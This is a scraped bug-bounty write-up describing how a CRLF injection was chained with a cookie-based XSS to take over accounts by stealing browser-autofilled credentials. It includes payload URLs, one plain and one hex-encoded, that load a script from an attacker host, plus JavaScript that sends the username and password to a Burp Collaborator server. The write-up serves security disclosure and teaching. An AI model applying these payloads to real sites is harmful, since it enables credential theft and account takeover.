---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-07-16_crlf-to-account-takeover-chaining-bugs.md
original_filename: 2022-07-16_crlf-to-account-takeover-chaining-bugs.md
title: CRLF to Account takeover (chaining bugs)
category: documents
detected_topics:
- xss
- command-injection
- cors
tags:
- imported
- documents
- xss
- command-injection
- cors
language: en
raw_sha256: 4696af2962d08e5ca37c8dfc2a75fb6ae19b0941a8344efd5260e393f79081d2
text_sha256: 48fa743edb4099a844cf82c1dfbb7f6e08a608e9cd7e2665260309c528b40dc6
ingested_at: '2026-06-28T07:32:12Z'
sensitivity: unknown
redactions_applied: false
---

# CRLF to Account takeover (chaining bugs)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-07-16_crlf-to-account-takeover-chaining-bugs.md
- Source Type: markdown
- Detected Topics: xss, command-injection, cors
- Ingested At: 2026-06-28T07:32:12Z
- Redactions Applied: False
- Raw SHA256: `4696af2962d08e5ca37c8dfc2a75fb6ae19b0941a8344efd5260e393f79081d2`
- Text SHA256: `48fa743edb4099a844cf82c1dfbb7f6e08a608e9cd7e2665260309c528b40dc6`


## Content

---
title: "CRLF to Account takeover (chaining bugs)"
url: "https://medium.com/@moSec/crlf-to-account-takeover-chaining-bugs-21a25dfa1cdf"
authors: ["MoSec (@moe1n1)"]
bugs: ["CRLF injection", "XSS", "Account takeover"]
publication_date: "2022-07-16"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2441
scraped_via: "browseros"
---

# CRLF to Account takeover (chaining bugs)

CRLF to Account takeover (chaining bugs)
MoSec
Follow
2 min read
·
Jul 16, 2022

378

7

Hi, everyone

Yeah, it's correct response splitting (CRLF) to account takeover, HOW ?!

Let's jump into it.

When I found a CRLF bug, I reported it like everyone, a low-hanging fruit seeker.

BUT they rejected it. (lack of reproducing capability), then I decided to dig deeper

“save what you found on your target one day at some moment you need them”

Now I have this CRLF on crlfsub.redacted.com

On another subdomain, let's call it xssub.redacted.com, I found out that this one has cookie-based XSS vulnerabilities, which means that a cookie is reflected in the response.

when Xssub.redacted.com loads it will redirect you to /login , and autocomplete where enabled

my brain:-

CRLF →set cookies+cookie based XSS →stored XSS +autocomplete credentials = ATO

CRLF →set cookies+cookie based XSS →stored XSS +autocomplete credentials = ATO

time for putting things together

1- the victim will open this link

Get MoSec’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

HTTP://crlfsub.redacted.com/stories-path%0a%0dSet-Cookie:vset=test</script><script src=https://moxss.server.com/steal_creds.js></script><img src=x onerror=alert(‘this_is_xss_to_ATO_your_cookies_and_saved_creds_has_been_sent_to_mosec_server_so_you_are_pwned’)>”;path=/;domain=.redacted.com;/articles/some-articles

HTTP://crlfsub.redacted.com/%0a%0dSet-Cookie:vset=%74%65%73%74%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%20%73%72%63%3d%68%74%74%70%73%3a%2f%2f%6d%6f%62%78%73%73%2e%73%65%72%76%65%72%2e%63%6f%6d%2f%73%74%65%61%6c%5f%63%72%65%64%73%2e%6a%73%3e%3c%2f%73%63%72%69%70%74%3e%3c%69%6d%67%20%73%72%63%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%27%74%68%69%73%5f%69%73%5f%78%73%73%5f%74%6f%5f%41%54%4f%5f%79%6f%75%72%5f%63%6f%6f%6b%69%65%73%5f%61%6e%64%5f%73%61%76%65%64%5f%63%72%65%64%73%5f%68%61%73%5f%62%65%65%6e%5f%73%65%6e%74%5f%74%6f%5f%6d%6f%73%65%63%5f%73%65%72%76%65%72%5f%73%6f%5f%79%6f%75%5f%61%72%65%5f%70%77%6e%65%64%27%29%3e%22;path=/;domain=.redacted.com;articles/some-articles

RESULT

Press enter or click to view image in full size

Stored XSS done

2-Finally all what our victims have to do is to go to Xssub.redacted.com, which will be redirected to /login, and the stores XSS via CRLF will be triggered and our js will be run

this is js code

console.log("password steal loaded.");
function load() {
var email=document.getElementById('login.username').value
console.log(email);
var pass=document.getElementById('login.password').value
console.log(pass);
 new Image().src="https://pkdyhhynhiuhnza9gz4o.burpcollaborator.net/login?u=" + email + "&p=" + pass;
}
window.onload = load;

I tested it on firefox and saved my credentials and because of the autocomplete, the attack was successful, this is the result of what I got in Burp collaborator.

GET /login?u=admin@ato.com&p=gaboompassword HTTP/1.1
Host: pkdyhhynhiuhnza9gz4o.burpcollaborator.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://redacted/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: cross-site
Te: trailers
Connection: close

this was Triager response, and of course, this type of response makes you happy

As result, it counted as high

Thanks for reading
